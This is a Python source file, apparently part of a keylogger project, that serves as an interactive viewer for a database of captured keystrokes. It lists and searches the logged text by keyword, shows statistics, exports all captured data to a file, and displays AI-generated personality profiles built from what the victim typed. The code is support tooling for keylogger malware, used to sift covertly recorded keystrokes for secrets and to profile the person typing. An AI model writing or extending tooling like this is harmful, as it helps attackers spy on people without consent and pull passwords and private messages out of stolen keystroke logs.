"""
Database Log Viewer and Analyzer
View all captured logs and AI analysis results
"""

import sqlite3
from datetime import datetime

DATABASE_FILE = "keylogger_database.db"

def print_separator(char="=", length=80):
    print(char * length)

def view_recent_logs(limit=10):
    """View most recent logs"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, timestamp, log_data, char_count 
            FROM keylogs 
            ORDER BY id DESC 
            LIMIT ?
        ''', (limit,))
        
        logs = cursor.fetchall()
        
        print_separator()
        print(f"📋 RECENT LOGS (Last {limit} entries)")
        print_separator()
        
        if not logs:
            print("No logs found in database.")
        else:
            for log in logs:
                log_id, timestamp, data, char_count = log
                print(f"\n🆔 ID: {log_id}")
                print(f"⏰ Time: {timestamp}")
                print(f"📊 Characters: {char_count}")
                print(f"📝 Data: {data[:200]}{'...' if len(data) > 200 else ''}")
                print("-" * 80)
        
        conn.close()
        
    except Exception as e:
        print(f"Error viewing logs: {e}")

def view_all_analyses():
    """View all AI personality analyses"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, analysis_time, total_chars, personality_type, confidence_score, analysis_result
            FROM ai_analysis 
            ORDER BY id DESC
        ''')
        
        analyses = cursor.fetchall()
        
        print_separator()
        print("🤖 AI PERSONALITY ANALYSIS HISTORY")
        print_separator()
        
        if not analyses:
            print("No AI analyses found in database.")
        else:
            for analysis in analyses:
                analysis_id, time, chars, personality, confidence, result = analysis
                print(f"\n🆔 Analysis ID: {analysis_id}")
                print(f"⏰ Time: {time}")
                print(f"📊 Data Analyzed: {chars} characters")
                print(f"👤 Personality Type: {personality}")
                print(f"💯 Confidence: {confidence}%")
                print(f"\n📄 Full Analysis:")
                print(result)
                print_separator("-")
        
        conn.close()
        
    except Exception as e:
        print(f"Error viewing analyses: {e}")

def get_statistics():
    """Get overall statistics"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        # Total logs
        cursor.execute('SELECT COUNT(*) FROM keylogs')
        total_logs = cursor.fetchone()[0]
        
        # Total characters
        cursor.execute('SELECT SUM(char_count) FROM keylogs')
        total_chars = cursor.fetchone()[0] or 0
        
        # Total analyses
        cursor.execute('SELECT COUNT(*) FROM ai_analysis')
        total_analyses = cursor.fetchone()[0]
        
        # First log time
        cursor.execute('SELECT MIN(timestamp) FROM keylogs')
        first_log = cursor.fetchone()[0]
        
        # Last log time
        cursor.execute('SELECT MAX(timestamp) FROM keylogs')
        last_log = cursor.fetchone()[0]
        
        # Most recent personality type
        cursor.execute('SELECT personality_type FROM ai_analysis ORDER BY id DESC LIMIT 1')
        result = cursor.fetchone()
        recent_personality = result[0] if result else "Not analyzed yet"
        
        print_separator()
        print("📊 DATABASE STATISTICS")
        print_separator()
        print(f"📝 Total Log Entries: {total_logs}")
        print(f"✍️  Total Characters Logged: {total_chars:,}")
        print(f"🤖 AI Analyses Performed: {total_analyses}")
        print(f"🕐 First Log: {first_log or 'N/A'}")
        print(f"🕑 Last Log: {last_log or 'N/A'}")
        print(f"👤 Current Personality Type: {recent_personality}")
        print_separator()
        
        conn.close()
        
    except Exception as e:
        print(f"Error getting statistics: {e}")

def search_logs(keyword):
    """Search for specific keyword in logs"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, timestamp, log_data, char_count 
            FROM keylogs 
            WHERE log_data LIKE ?
            ORDER BY id DESC
        ''', (f'%{keyword}%',))
        
        logs = cursor.fetchall()
        
        print_separator()
        print(f"🔍 SEARCH RESULTS for '{keyword}'")
        print_separator()
        
        if not logs:
            print(f"No logs found containing '{keyword}'")
        else:
            print(f"Found {len(logs)} matching entries:\n")
            for log in logs:
                log_id, timestamp, data, char_count = log
                print(f"🆔 ID: {log_id} | ⏰ {timestamp}")
                print(f"📝 {data[:150]}{'...' if len(data) > 150 else ''}\n")
        
        conn.close()
        
    except Exception as e:
        print(f"Error searching logs: {e}")

def main_menu():
    """Interactive menu for viewing logs"""
    while True:
        print("\n" + "="*80)
        print("🔐 KEYLOGGER DATABASE VIEWER")
        print("="*80)
        print("\n1. View Recent Logs")
        print("2. View AI Analysis History")
        print("3. View Statistics")
        print("4. Search Logs")
        print("5. Export All Data")
        print("6. Exit")
        print("\n" + "="*80)
        
        choice = input("\nEnter your choice (1-6): ").strip()
        
        if choice == '1':
            limit = input("How many recent logs to view? (default 10): ").strip()
            limit = int(limit) if limit.isdigit() else 10
            view_recent_logs(limit)
        elif choice == '2':
            view_all_analyses()
        elif choice == '3':
            get_statistics()
        elif choice == '4':
            keyword = input("Enter keyword to search: ").strip()
            if keyword:
                search_logs(keyword)
        elif choice == '5':
            export_data()
        elif choice == '6':
            print("\n👋 Goodbye!")
            break
        else:
            print("Invalid choice. Please try again.")
        
        input("\nPress Enter to continue...")

def export_data():
    """Export all data to text file"""
    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        filename = f"keylogger_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("="*80 + "\n")
            f.write("KEYLOGGER DATABASE EXPORT\n")
            f.write(f"Export Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("="*80 + "\n\n")
            
            # Export logs
            cursor.execute('SELECT timestamp, log_data, char_count FROM keylogs ORDER BY id')
            logs = cursor.fetchall()
            
            f.write(f"\nTOTAL LOGS: {len(logs)}\n")
            f.write("="*80 + "\n\n")
            
            for timestamp, data, chars in logs:
                f.write(f"[{timestamp}] ({chars} chars)\n")
                f.write(f"{data}\n")
                f.write("-"*80 + "\n")
            
            # Export analyses
            f.write("\n\n" + "="*80 + "\n")
            f.write("AI PERSONALITY ANALYSES\n")
            f.write("="*80 + "\n\n")
            
            cursor.execute('SELECT analysis_time, personality_type, analysis_result FROM ai_analysis ORDER BY id')
            analyses = cursor.fetchall()
            
            for time, personality, result in analyses:
                f.write(f"\n[{time}] Personality: {personality}\n")
                f.write(result + "\n")
                f.write("-"*80 + "\n")
        
        conn.close()
        print(f"\n✓ Data exported to: {filename}")
        
    except Exception as e:
        print(f"Error exporting data: {e}")

if __name__ == "__main__":
    main_menu()
